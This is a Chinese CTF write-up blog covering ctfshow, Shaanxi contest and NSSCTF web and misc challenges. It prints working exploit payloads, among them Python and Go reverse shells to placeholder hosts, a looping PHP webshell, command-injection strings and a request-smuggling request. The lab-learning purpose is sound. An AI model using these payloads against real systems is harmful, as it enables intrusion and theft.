WEB-72(php原生类+UAF)\n\n这道题目看大佬的WP是 开启了open_basedir。  \n\n因此需要打组合拳\n\nDirectoryIterator与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。  \n\n这道题目用到了php原生类 之前有了解过 https://xz.aliyun.com/t/9293#toc-13\n\n```php\nc=?><?php\n$a=new DirectoryIterator(\"glob:///*\");\nforeach($a as $f)\n{echo($f->__toString().' ');\n} \nexit(0);\n?>\n```\n\n先通过这个payload 获取flag文件名\n\n首先通过`?>`先闭合之前的`<?php`再通过原生类DirectoryIterator()不断遍历来获取根目录下的文件\n\nglob://协议 查找匹配的文件路径模式 \n\n`glob:///*`应该怎么理解呢 就是查找 根目录下`/*`这里的`*`就是linux的通配符 就是说根目录下的所有文件都被会读取\n\n  `__toString()方法可以获取字符串形式的文件名 `\n\n读取的时候需要不断地遍历 因此需要\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687763552888-a3900bed-abe0-411e-aa26-194a77f58fd0.png)\n\n发现flag在flag0.txt 之后是pwn的知识我挺懵逼的\n\n通过UAF脚本去读flag 挺夸张的\n\n# WEB-72~74(php原生类)\n\n和上面一样通过原生类获取flag文件名 然后这里可以直接用include()函数读flag即可\n\n```\nc=include('/flagc.txt');exit;\n```\n\n# WEB-75~76(mysql load_file())\n\n这题目太抽象了 连接mysql通过mysql的load_file()去读文件 。。。\n\n```php\nc=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',\n'root');foreach($dbh->query('select load_file(\"/flag36.txt\")') as $row)\n{echo($row[0]).\"|\"; }$dbh = null;}catch (PDOException $e) {echo $e-\n>getMessage();exit(0);}exit(0);\n```\n\n# WEB-77(FFI)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687765898573-1e127140-9340-45ea-8344-54348dd7523d.png)\n\n我的理解是让php直接调用底层c语言的函数利用c代码实现功能\n\n```c\nc=$ffi = FFI::cdef(\"int system(const char *command);\");\n$a='/readflag > 1.txt';\n$ffi->system($a);\n```\n\nFFI::cdef()创建一个FFI对象\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687765988379-4c1b4a1f-62e9-418c-a270-ca5da1c112c0.png)\n\n然后利用c语言调用system()函数\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687766113821-5efd6715-e709-4dd4-a066-6974d5a2cf79.png)\n\n# WEB-118（${PATH}）\n\nfuzz一下发现只能用 大写字母A-Z和${}~.?:\n\n通过linux环境变量截取字母方式构造rce\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687766943345-9b8e89eb-1525-4a07-bb3a-9341e8c19f03.png)\n\n关于PATH\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687767036592-081f4207-8e55-41a1-93e9-fba8c718b899.png)\n\n然后截取我们想要的字母RCE即可\n\n构造 nl flag.php\n\n`${PATH:~A}${PWD:~A}$IFS????.???` 这里A和数字0是一样的效果都是下标 然后`~`表示从末尾开始截取\n\n在这里我们的默认位置为`/var/www/html` 因此才能截取到l\n\n# WEB-119~124(奇淫构造paylaod)\n\nwal了PATH直接偷了payload\n\n119:\n\n```php\n/bin/cat flag.php\ncode=${HOME:${#}:${##}}???${HOME:${#}:${##}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???\n/bin/base64 flag.php\ncode=${HOME:${#}:${##}}???${HOME:${#}:${##}}?????${#RANDOM} ????.???\n```\n\n120:\n\n```plain\ncode=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???\n```\n\n121:\n\n```php\n/bin/bash64\ncode=${PWD:${#}:${##}}???${PWD:${#}:${##}}?????${#RANDOM} ????.???\n/bin/rev\ncode=${PWD::${#?}}???${PWD::${#?}}${PWD:${#IFS}:${#?}}?? ????.???\n```\n\n122:\n\n`#` 和 `SHLVL`都不能用了,可以用`$?`来表示1\n\n通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误\n\n但是默认`$?`默认为0  可以 `<A` 返回的错误值 使得 `$?` 为1  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687768487790-1c21e6fc-1c8e-42a2-8b99-b78ad3bd770e.png)\n\n `paylaod：code=<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???` 多试几次就能成功\n\n124：\n\nbuuctf Love math一模一样的题目 我博客也写过不赘述了\n\npayload稍稍不同\n\n```\n?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos})&abs=system&acos=cat%20flag.php\n```\n\n\n\n# 结尾：\n\n哦 终于结束这一章了 断断续续三天日完了 做吐了  开启下一章！ Keep Hacking！\n","tags":["命令执行"],"categories":["ctfshow"]},{"title":"2023年 第三届陕西省大学生网络安全技能大赛（高职院校组）","url":"/post/ba5897f5.html","content":"\n2023年 第三届陕西省大学生网络安全技能大赛（高职院校组）web复现\n\n<!--more-->\n\n# **easyrce**\n\n源码如下：\n\n```php\n<?php\n  error_reporting(0);\nhighlight_file(__FILE__);\n\nif (!empty($_GET['PK'])){\n  $PK = $_GET['PK'];\n  if(blacklistFilter($_SERVER[\"QUERY_STRING\"])){\n    include $PK;\n  }else{\n    highlight_file(__FILE__);\n  }\n}\n\nfunction blacklistFilter($arg) {\n  $blacklist = array('[', ']', ';', '?', '@', '(', ')', 'exec', 'eval', '$', 'phpinfo', 'flag', 'data', 'filter', '#');\n  $filteredInput = str_replace($blacklist, '', $arg);\n  return $filteredInput;\n}\n```\n\n这几乎该waf的全waf \n\n直接用file://协议读就行了 再来好好看看这个协议;\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686237629788-b92a3fc6-11a3-4ba6-8077-8cde77aff1f7.png)\n\ntql\n\n# mua\n\n这题太抽象了！！\n\n```php\n<?php\n    ignore_user_abort(true);\n    set_time_limit(0);\n    $file = 'shell.php';\n    $code = '<?php if(md5($_GET[\"pass\"])===\"c9b30e9fad74c62c2d0e4bb820964913\"){ if(strlen($_GET[\\'cmd\\'])<9){ @system($_GET[\\'cmd\\']); } } ?>';\n    while (1){\n        file_put_contents($file,$code);\n    usleep(5000);\n?>\n```\n\n发现给了源码 但是这个md5根本就不让人解出来\n\n查看robots.txt 发现`/substr_pass.php`\n\n获得hint `?a=xx&b=xx`\n\n传参`?a=0&b=1` 不同数字时会给我们pass内容\n\n当b=3 a为其他数字 可以爆出pass的内容 这里需要写一个脚本完成\n\n```python\nimport requests\nurl = 'http://b36384f5.clsadp.com/substr_pass.php'\nresult = []\nfor i in range(100):\n    payload = {\"a\":\"{}\".format(i),\"b\":3}\n    r = requests.get(url=url,params=payload)\n    print(r.text)\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686239466990-7ea623b7-9543-41e6-941e-0041b5555925.png)\n\npass=password是富强民主文明和谐自由平等公正法制爱国敬业诚信友善   妈的 太抽象了 \n\npayload：`shell.php?pass=password是富强民主文明和谐自由平等公正法制爱国敬业诚信友善&cmd=cat /h*`\n\n# **PPP**\n\n这是一道python的原型链污染 之前没见过 但是跟nodejs的原型链污染大同小异 python原型链具体分析之后会补上 现在实在没时间 直接狂看 这篇文章 md源码是从这里偷的八https://tttang.com/archive/1876/\n\n给了附件源码 如下：\n\n```python\nfrom flask import Flask,request\nimport json\n\napp = Flask(__name__)\n\ndef merge(src, dst):\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n\ndef evilFunc(arg_1 , * , shell = False):\n    if not shell:\n        print(arg_1)\n    else:\n\n        print(__import__(\"os\").popen(arg_1).read())    \n\nclass Family:\n    def __init__(self):\n        pass  \n\nfamily = Family()\n\n@app.route('/',methods=['POST', 'GET'])\ndef index():\n    if request.data: //其实就是post传参\n        merge(json.loads(request.data), family)\n        evilFunc(\"whoami\")\n    return \"fun\"\n\n@app.route('/eval',methods=['GET'])\ndef eval():\n    if request.args.get('cmd'):\n        cmd = request.args.get('cmd')\n        evilFunc(cmd)\n    return \"ok\"\n\n\napp.run(host=\"0.0.0.0\",port= 3000,debug=False)\n```\n\n可以发现有 /和/eavl\n\n 看到了老熟人 `merge()`\n\npython原型链污染的重要代码就是这部分\n\n```python\ndef merge(src, dst):\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n```\n\n达到的效果和nodejs中的差不多\n\n在/eval路由中 我们将get获取到的值传给`evilFunc(cmd)`\n\n```python\ndef evilFunc(arg_1 , * , shell = False):\n    if not shell:\n        print(arg_1)\n    else:\n\n        print(__import__(\"os\").popen(arg_1).read()) \n```\n\n但前提是 这个shell参数为为true 也是就为1也就是 `if not shell`这个判断语句为假 \n\n可以看到这个函数被创建时已经默认复制给`shell = False` 也就是0的效果 如果我们可以原型链污染 将默认值设置为`shell = 1` 那么就可以命令执行了\n\n`__kwdefaults__` 是 Python 中函数对象的一个特殊属性，用于获取函数的关键字参数的默认值。  \n\nevilFunc()属于全局函数要用`__globals__`\n\npayload如下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686391717044-677ff244-2d5c-45ee-ac79-c6ff7d8940dd.png)\n\n```python\n{\n    \"__init__\" : {\n        \"__globals__\" : {\n            \"evilFunc\" : {\n                \"__kwdefaults__\" : {\n                    \"shell\" : 1\n                }\n            }\n        }\n    }\n}\n```\n\n或者是\n\n```python\n{\n    \"__init__\" : {\n        \"__globals__\" : {\n            \"evilFunc\" : {\n                \"__defaults__\" : (\n                    True ,\n                )\n            }\n        }\n    }\n}\n```\n\n然后在/下打入\n\n再到/eval路由下反弹shell即可 \n\n这里反弹shell的时候当时用了bash试了好多次没有成功 因为是复现 估计是靶场问题 但是用python反弹就可以成功 payload如下\n\n```python\ncmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n```\n\n# **pyweb**\n\n放过自己\n","tags":["python原型链污染"],"categories":["各赛事WP"]},{"title":"2023年 第三届陕西省大学生网络安全技能大赛（本科高校组）","url":"/post/96d146ad.html","content":"\n2023年 第三届陕西省大学生网络安全技能大赛（本科高校组） web misc复现\n\n<!--more-->\n\n# 前言\n\n这次反应出我的缺点：\n\n1. 不够细心，ezpop进去后没有源码 以为是上neepu一样的源码泄露，没成功，然后扫了后台，一顿瞎操作，看了WP才发现是js中有一段base64，妈的，我真是纯出生，不够认真已经是老毛病了。\n2. 找到答案了没有能够仔细照payload进行 那个反序列化修改私有属性考反射的题目 我tm已经payload写的和答案几乎一样了，细节可能有问题，但是当时做题不知道为啥还是显示被waf 然后就放弃了 。。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685798284302-dc2c0ac8-5db9-4eb6-95f8-f566951d3782.png)\n\n妈的 这道题目真可惜\n\n3.老是想象着把题目想的很复杂很难，可能一些题目需要很扎实的基本功吧。\n\n# WEB\n\n## ezrce\n\n这道题目一眼丁真 和buu那个套娃一样 主要考的就是无参RCE，比较友好。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685799018101-fb2d644a-0735-4333-b4da-4e64b2a493b1.png)\n\n代码如上 偷的 复现没环境 很难受\n\n自己写一下\n\n```php\n<?php\nerror_reporting(0);\nheader(\"Content-Type:text/html;charset=utf-8\"); //没有这个就会乱码\necho \"你是谁啊哥们？把钥匙给我！！！！<br/r>\";\n$key=$_GET['key'];\n$name=$_POST['name'];\n$qaq=$_POST['qaq'];\nif(isset($_GET['key'])){\n\thighlight_file(__FILE__);\n}\nif(isset($name)){\n\techo \"你是\".$name.\"大人????<br/>\";\n\t$name1=preg_replace('/hahaha/e',$qaq,$name);\n\techo \"骗我的吧，你明明是    >>>>小小\".$name1;\n}\n?>\n```\n\n`preg_replace() /e`模式可以代码执行\n\n我的payload：`name=hahaha&qaq=print_r(eval(array_pop(apache_request_headers())))`\n\n```\napache_request_headers()`代替`getallheaders()\n```\n\n然后next 之类的移动指针都被waf了 用`array_pop`bypass 也就是把数组中最后一个元素值弹出 我们bp抓包修改一下 其实还有其他移动指针的函数：`each()prev()以及current()`但是都是指向当前由请求头组成数组的第一个元素 也就是host 这个改了网页就没法正常访问了 所以只能通过`array_pop()`把最后一个修改了 记得当时是`X-Real-Ip`\n\n看了大佬的WP 还有一种是参考https://xz.aliyun.com/t/9360 通过`session_id()`来做的\n\npaylaod:`name=hahaha&qaq=show_source(session_id(session_start()));`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685803106675-e16d229d-5e6d-40d0-9653-7cf198352d91.png)\n\n然后抓包 `Cookie: session_id=/flag`即可\n\n## ezpop\n\n这个题进去没源码 以为是当时那个PHP <= 7.4.21远程源码泄露漏洞 https://cn-sec.com/archives/1530845.html\n\n试了 无果 最后看他js中藏了一段base64 我眼瞎\n\n但是tm谷歌浏览器他在源码中没显示出来 我操了 这不是我的锅啊 我日了\n\n源码如下：\n\n```php\n<?php\nhighlight_file(__FILE__);\n\nclass night\n{\n    public $night;\n\n    public function __destruct(){\n        echo $this->night . '哒咩哟';\n    }\n}\n\nclass day\n{\n    public $day;\n\n    public function __toString(){\n        echo $this->day->go();\n    }\n\n    public function __call($a, $b){\n        echo $this->day->getFlag();\n    }\n}\n\n\nclass light\n{\n    public $light;\n\n    public function __invoke(){\n        echo $this->light->d();\n    }\n}\n\nclass dark\n{\n    public $dark;\n\n    public function go(){\n        ($this->dark)();\n    }\n\n    public function getFlag(){\n        include(hacked($this->dark));\n    }\n}\n\nfunction hacked($s) {\n    if(substr($s, 0,1) == '/'){\n        die('呆jio步');\n    }\n    $s = preg_replace('/\\.\\.*/', '.', $s);\n    $s = urldecode($s);\n    $s = htmlentities($s, ENT_QUOTES, 'UTF-8');\n    return strip_tags($s);\n}\n\n$un = unserialize($_POST['pop']); //\nthrow new Exception('seino');\n```\n\n链子如下：\n\n```php\n<?php\nclass night\n{\n public $night;\n}\n\nclass day\n{\n    public $day;\n}\n\nclass light\n{\n    public $light;\n}\nclass dark\n{\n    public $dark;\n}\n$a=new night();\n$a -> night=new day();\n$a -> night ->day=new dark();\n$a ->night ->day -> dark=new light();\n$a -> night ->day ->dark -> light=new day();\n$a ->night ->day ->dark ->light->day=new dark();\n$a ->night ->day ->dark ->light->day->dark='php://filter/convert.base64-encode/resource=/flag';\necho serialize($a);\n?>\n```\n\n需要注意的点就是这里会过滤/flag 的第一个`/`直接用伪协议读就可以了\n\n其次就是`throw new Exception('seino');`阻止我们的链子 其实考点就是fast destrcut\n\n随便破坏链子的结构可以了 之前见过\n\npayload:\n\n```\nO:5:\"night\":1:{s:5:\"night\";O:3:\"day\":1:{s:3:\"day\";O:4:\"dark\":1:{s:4:\"dark\";O:5:\"light\":1:{s:5:\"light\";O:3:\"day\":1:{s:3:\"day\";O:4:\"dark\":1:{s:4:\"dark\";s:49:\"php://filter/convert.base64-encode/resource=/flag\";}}}}}}\n```\n\n然后这里还有坑 发现传上去之后没用 用不了\n\n然后这里复制代码到vscode才发现玄机\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686228298550-cd785a8f-057e-4944-8fbd-e3b6aba0b7f2.png)\n\n传参这里有unicode不可见字符 [U+2066]类似于这样的是控制文本显示方向的 没必要细究\n\n然后传参肯定是这一坨 需要url编码一下\n\npyaload:`%E2%80%AE%E2%81%A6%E5%BF%AB%E7%BB%99%E6%88%91%E4%BC%A0%E5%8F%82%E2%81%A9%E2%81%A6pop=O:5:\"night\":1:{s:5:\"night\";O:3:\"day\":1:{s:3:\"day\";O:4:\"dark\":1:{s:4:\"dark\";O:5:\"light\":1:{s:5:\"light\";O:3:\"day\":1:{s:3:\"day\";O:4:\"dark\":1:{s:4:\"dark\";s:49:\"php://filter/convert.base64-encode/resource=/flag\";}}}}}`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686229023127-78b15df4-f547-4e95-941c-36a93eec2677.png)\n\n## test\n\n进去是一个登录框 可以注册 然后登录 然后就会显示 `hello 登录名`看到这里谁不会想到是ssti呢 但是这是一个幌子 然后在登陆页面看源码可以发现\t`/profile/index` 啥也没有 当然如果真没用 他也不会特意设置 唉 我真是猪脑 然后可以访问`/profile/admin`MD5解密 获得 admin的密码 asdfgh123\n\n进去之后 看了大佬的wp 提示帮我们运行go文件\n\n然后手写一个上传框  亮sensei给的\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>POST数据包POC</title>\n  </head>\n  <body>\n    <form action=\"http://15e46d8b.clsadp.com/Adm1nUp104d\" method=\"post\" enctype=\"multipart/form-data\">\n      <!--链接是当前打开的题目链接-->\n      <label for=\"file\">文件名：</label>\n      <input type=\"file\" name=\"uploadfilename\" id=\"file\"><br>\n      <input type=\"submit\" name=\"submit\" value=\"提交\">\n    </form>\n  </body>\n</html>\n```\n\n上传上去之后抓包将 name改为file \n\n这里问后端java舍友说是因为后端可能存在一个名为file的变量来接受他 所以这里要改为file tql 终于明白了\n\n因此` <input type=\"file\" name=\"uploadfilename\" id=\"file\"><br>`中的name值不是固定的 要根据情况而定\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686235767394-f3ed6a07-925e-44c0-939f-3166d70d17a3.png)\n\n然后上传go的反弹shell文件(偷的) 如下\n\n```go\npackage main\n\nimport (\n    \"fmt\"\n    \"log\"\n    \"os/exec\"\n)\n\nfunc main() {\n    cmd := exec.Command(\"/bin/bash\", \"-c\", \"bash -i &> /dev/tcp/ip/port 0>&1\")\n    out, err := cmd.CombinedOutput()\n    if err != nil {\n      fmt.Printf(\"combined out:\\n%s\\n\", string(out))\n      log.Fatalf(\"cmd.Run() failed with %s\\n\", err)\n  }\n    fmt.Printf(\"combined out:\\n%s\\n\", string(out))\n}\n```\n\n就可以了 真的tql\n\n## unserialize\n\n这道题目很可惜 应该是出了的 通过反射来修改类的的私有属性\n\n源码如下;\n\n```php\n<?php\n  highlight_file(__FILE__);\nheader(\"Content-type:text/html;charset=utf-8\");\nrequire_once \"waf.php\";\nerror_reporting(0);\nclass getFlag{\n  private $password;\n  private $cmd;\n  public function __destruct(){\n    if($this->password==\"sectet\" ) //how to change the private variables secret\"\n    {\n      system($this->cmd);\n    }\n  }\n}\n\n$a = $_GET['a'];\nif(isset($_GET['a'])){\n  @eval(waf($a));\n}\n  ?>\n```\n\n看了大佬的WP 有个很简单的非预期\n\n### 非预期\n\n直接通过%0a 换行符进行bypass\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685803232225-93d4798a-5be8-4d62-a11b-e8aac6f367da.png)\n\npayload：`a=system%0a('cat /flag');`\n\n 以后做题 `%00 空字符 %20 空格符 %0a 换行符`这种非预期要多尝试\n\n### 预期\n\n草！！！！！！！！！！！！\n\n这个题目 回过头再看我的payload是对的 只不过把`sectet`拼成`secret`不是 sectet是什么啊 我真服了 我一直当作secret在做题 md 我真无语了 sectet到底是出题人拼错了 还是有含义啊 我真服了\n\n利用PHP反射来给私有属性赋值以及调用私有函数\n\n参考这篇文章：分析的很细 https://juejin.cn/post/6844904148891074568\n\n分析：\n\n```php\n<?php\nclass getFlag{\n    private $password;\n    private $cmd;\n    private function display(){\n        echo $this->password;\n    }\n}\n$get_flag = new getFlag();\n$refClass = new ReflectionClass('getFlag');\n$property = $refClass->getProperty('password'); //获取属性值\n$property->setAccessible(true); //修改对象$property的可访问属性\n$property->setValue($get_flag, 'sectet');  //修改值\n$property = $refClass->getProperty('cmd');//获取属性值\n$property->setAccessible(true);//修改对象$property的可访问属性\n$property->setValue($get_flag, 'ls /'); //修改值\nvar_dump($get_flag); //打印源对象属性值\n?>\n//class getFlag#1 (2) {\n  private $password =>\n  string(6) \"secret\"\n  private $cmd =>\n  string(4) \"ls /\"\n}\na=$get_flag = new getFlag();$refClass = new ReflectionClass('getFlag');$property = $refClass->getProperty('password'); $property->setAccessible(true); $property->setValue($get_flag, 'sectet');  $property = $refClass->getProperty('cmd');$property->setAccessible(true);$property->setValue($get_flag, 'ls /');\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685805828849-a21b53f3-1ce1-41c7-a71d-3c0796298211.png)\n\n## Esc4pe_T0_Mong0\n\n没源码 暂定\n\n# Misc\n\n## 管道\n\n一道关于图片隐写的题目 直接 `zsteg -a 1.png|grep \"flag\"`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686062254676-b77d0ea0-ca69-4769-914c-58379f6e7b6b.png)\n\n## 可是雪啊飘进双眼\n\n首先是一段音频和一个文本 然后拖进Audacity查看波形图 一段摩斯电码 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686062510940-7c390b3f-68a7-411f-94c4-5d22536f7537.png)\n\n上网查一下学习一下 得到`.-- --- .- .. ... .... .- -. -..- ..`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686063064061-e8f63abe-d04f-4cec-bd58-a675810b402e.png)\n\n得到密文WOAISHANXI\n\n但是还是没法解开加密的压缩包\n\n然后还有一个文本 从名字上能看出是snow加密 \n\n在https://darkside.com.au/snow/下载一个脚本 输入刚才得到的密码 然后解密即可\n\n```\nsnow.exe -p WOAISHANXI -C snow.txt\n```\n\n得到\n\n获得flag压缩包的密码\n\n然后我这里binwalk抽风了 很奇怪 之前用的好好的 玛德\n\n 找到原因了 原来要用root运行在之后加上 `--run-as=root`就可以了\n","tags":["pop链"],"categories":["各赛事WP"]},{"title":"NSSCTFRound#13 Web","url":"/post/a2e74ccf.html","content":"\nNSSCTFRound#13 Web\n\n<!--more-->\n\n# flask?jwt?\n\n一道简单的session伪造题目 \n\n登录框 找回密码处抓包可以看到key `th3f1askisfunny`\n\n然后session伪造即可\n\n这里稍微注意一下就是`{'_fresh': True, '_id': '265688f22c7df9002e7945b00aed58a7d242ad62b885769d87fd147973f6e663d4e0cdece191e918da66579e1ae54cd9c622333f1832675ef4d8e3f28a66286e', '_user_id': '2'}`\n\n以往我们都是将name改为admin即可 这道题目将2改为1即可 改为0的话就是没登录状态\n\n# ez_factors\n\nfactors是linux自带的一个因式分解命令\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685889160546-2005ec4d-9a98-4a80-9e14-fee82b88af57.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685889248604-c2be769c-5f1d-4597-a7ea-285b97e3c2a4.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685889267180-68e09028-c066-4c24-8a06-3d5b1870d89d.png)\n\n发现题目显示的结果与我们在linux执行factor一样 那么猜测这里存在命令执行\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685889334541-7c569cc4-1cdf-47cb-ba3a-af0cfd2d6d4a.png)\n\n发现我们执行命令是可以的 读一下/etc/passwd\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685889385397-f451cb1c-983c-4bd0-9d57-d71c0e036345.png)\n\n也是有回显的 说明我们命令是执行成功的 但是输出结果过滤掉了除冒号和数字以外的符号\n\n这里注意一下要将我们路径中的斜杠需要url编码一下 防止与url中的反斜杠产生歧义\n\n所以我只要使其输出全部为数字 就能bypass了\n\n这里用到了od命令\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685890407040-e7f3bcc3-2733-4f05-b105-964779b50649.png)\n\npayload:`114514;od%20-t%20d1%20%2Fflag`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685890848402-df76c787-edac-4b49-8e87-e33f941eb3ef.png)\n\nod -t d1的命令解释：![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685890875226-8b96b7b2-8dcf-463b-83c9-3b0698dcce6b.png)\n\n输出了每个字节按十进制输出\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685890900112-c8886efe-e6d4-447b-9282-10d0ab6bce08.png)\n\n注意前面的是序号\n\n78   83   83   67   84   70  123  101   99   52   52   49  102   52   98   45 52   50   48  101   45   52   48   53   55   45   56   51   53   97   45   51 97   50   50   53  102   98   99   56  102   53   57  125   10\n\n将每个十进制转为十六进制然后转为字符串即可\n\n十六进制：4E 53 53 43 54 46 7B 65 63 34 34 31 66 34 62 2D 34 32 30 65 2D 34 30 35 37 2D 38 33 35 61 2D 33 61 32 32 35 66 62 63 38 66 35 39 7D 0A\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685891274348-6b1b73c6-5ab4-4a85-a054-4c690fa0399c.png)\n\n# 信息收集\n\n这个题目做的很懵逼 \n\n访问index.php 有个文件包含\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685891636930-b6f7fd18-9e51-4da2-bbff-8f3bad0af203.png)\n\npayload的是：`GET /nssctf/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/flag.txt HTTP/1.1`\n\n最终在请求包中达到的效果为：\n\n```php\nGET /nssctf/1 HTTP/1.1\nHost: localhost\n\nGET /flag.txt HTTP/1.1\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685891844152-426610f9-325e-4931-8a2e-4c11ec531881.png)\n\n看大佬WP是Apache HTTP Server 请求走私漏洞 CVE-2023-25690  参考：https://xz.aliyun.com/t/12345\n\n还有CRLF注入 参考https://www.cnblogs.com/mysticbinary/p/12560080.html\n\n 问了一下GPT 感觉说的很到位\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685893209885-190c8bdf-5096-432d-aa41-1e3b330ed3f9.png)\n\n比如我们可以bp抓包一下 就可以看到请求体内容结尾都是`\\r\\n`结尾的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685893262097-fc9bc818-3057-40e5-9682-ff08840dfb9b.png)\n\n在HTTP当中HTTP的Header和Body之间就是用两个crlf进行分隔的，如果能控制HTTP消息头中的字符，就能注入一些恶意的换行\n\n比如chatGPT在其中恶意添加`crlf`(`\\r\\n`) 再加入一个恶意制造的请求体 导致解析出问题\n\n回到题目 读 `/usr/local/apache2/conf/httpd.conf `\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685893714348-0be9e595-5bb8-4700-a349-65a365c46e4b.png)\n\n看大佬wp是 做了个proxy转发\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685893829245-9b00596b-9ab3-444f-9071-919a318397fc.png)\n\n这也就是为什么payload访问的是localhost 从内部网上的服务器去读flag.txt\n\n\n\n# MyWeb\n\n源码如下：\n\n```php\n<?php\nerror_reporting(E_ALL);\n// 写了个网页存储JSON数据，但是还不会处理json格式，这样处理应该没有什么问题吧\n\nif ($_GET['mode'] == 'save') {\n    $data = file_get_contents('/tmp/data.json');\n    $value = addslashes($_GET['value']);\n    $data = str_replace(']', \", '$value']\", $data);\n    file_put_contents('/tmp/data.json', $data);\n} else if ($_GET['mode'] == 'read') {\n    $data = file_get_contents('/tmp/data.json');\n    eval('$data = ' . $data . ';');\n    print_r($data);\n} else {\n    highlight_file(__FILE__);\n}\n```\n\n类似于一个沙箱逃逸吧 构造特殊的方式来bypass\n\nmode=save 读入 mode=read 读出\n\n主要是： `$data = str_replace(']', \", '$value']\", $data);`利用这个逃逸\n\n我们不输入任何内容直接读一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685975601896-db938c1a-e2b4-45c2-97f5-9d5776fb37c5.png)\n\n发现只有一个元素1\n\n这里就类似于构造sql注入一样 构造让`[]`去闭合再加上注释加换行`%0a` 相互换来换去 总有一种方式可以\n\n原来形式猜测是[1]\n\n替换后`[1,$value]`\n\n则我们构造`];//%0a<shell>;//%0a[`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685976182529-dead647c-0922-4d2b-b2b1-ac053420687a.png)\n\n\n\n# flask?jwt?(hard)\n\n这道就是第一道的加强版 key没有给我们 所以只能去找\n\n发现提示 有个路由`/wor`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685976386165-68580a32-578a-4527-a49c-081a5a841acf.png)\n\n发现它可以获取我们上次的登陆时间 \n\n当时这里就没有思路了\n\n看了WP 访问`/wor`让其报错 然后能看到源码中的key\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685977285646-aec5a446-c9c9-459d-9a35-1122b6cb80bc.png)\n\nkey：`hardgam3_C0u1d_u_f1ndM3????`\n\n这样获取key的方式还是第一次见 涨知识了 \n\n接着就是老套路 